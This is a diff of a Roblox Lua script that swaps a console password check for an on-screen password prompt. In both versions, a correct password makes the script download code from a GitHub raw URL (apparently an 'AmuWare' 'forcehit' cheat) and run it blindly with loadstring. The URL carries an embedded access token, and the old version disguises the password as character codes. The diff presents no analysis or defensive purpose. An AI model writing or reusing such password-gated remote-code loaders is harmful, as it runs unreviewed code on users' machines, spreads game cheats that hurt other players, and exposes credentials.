@@ -1,23 +1,63 @@
-local a = {70,101,97,82,117,110,115,89,111,117} -- "FeaRunsYou"
-local function decode(t)
-    local s = ""
-    for i = 1, #t do
-        s = s .. string.char(t[i])
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "PasswordPromptGui"
+screenGui.Parent = PlayerGui
+
+-- Create Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 150)
+frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+frame.Parent = screenGui
+
+-- Create TextBox for password input
+local passwordBox = Instance.new("TextBox")
+passwordBox.Size = UDim2.new(0, 280, 0, 40)
+passwordBox.Position = UDim2.new(0, 10, 0, 50)
+passwordBox.PlaceholderText = "Enter password"
+passwordBox.Text = ""
+passwordBox.ClearTextOnFocus = false
+passwordBox.TextScaled = true
+passwordBox.Parent = frame
+
+-- Create TextButton to submit password
+local submitButton = Instance.new("TextButton")
+submitButton.Size = UDim2.new(0, 280, 0, 40)
+submitButton.Position = UDim2.new(0, 10, 0, 100)
+submitButton.Text = "Submit"
+submitButton.TextScaled = true
+submitButton.Parent = frame
+
+-- Password to check
+local correctPassword = "FeaRunsYou"
+
+submitButton.MouseButton1Click:Connect(function()
+    if passwordBox.Text == correctPassword then
+        screenGui:Destroy()
+        -- Load your external script here
+        local url = "https://raw.githubusercontent.com/featizm/AmuWare/refs/heads/main/forcehit?token=GHSAT0AAAAAADEFAJFFUEKQKPZWIIBWZSSC2BLMDQQ"
+        local success, scriptContent = pcall(function()
+            return game:HttpGet(url)
+        end)
+        if success then
+            local func = loadstring(scriptContent)
+            if func then
+                func()
+            else
+                warn("Failed to load script")
+            end
+        else
+            warn("Failed to get script from URL")
+        end
+    else
+        warn("Incorrect password!")
     end
-    return s
-end
+end)
 
-print("Enter password to load script:")
-local input = io.read()
-
-if input == decode(a) then
-    local u = "https://raw.githubusercontent.com/featizm/AmuWare/refs/heads/main/forcehit?token=GHSAT0AAAAAADEFAJFFUEKQKPZWIIBWZSSC2BLMDQQ"
-    local r = game:HttpGet(u)
-    local f = loadstring(r)
-    f()
-else
-    print("Incorrect password. Access denied.")
-end
 
 local TweenService = game:GetService("TweenService")
 local player = game.Players.LocalPlayer
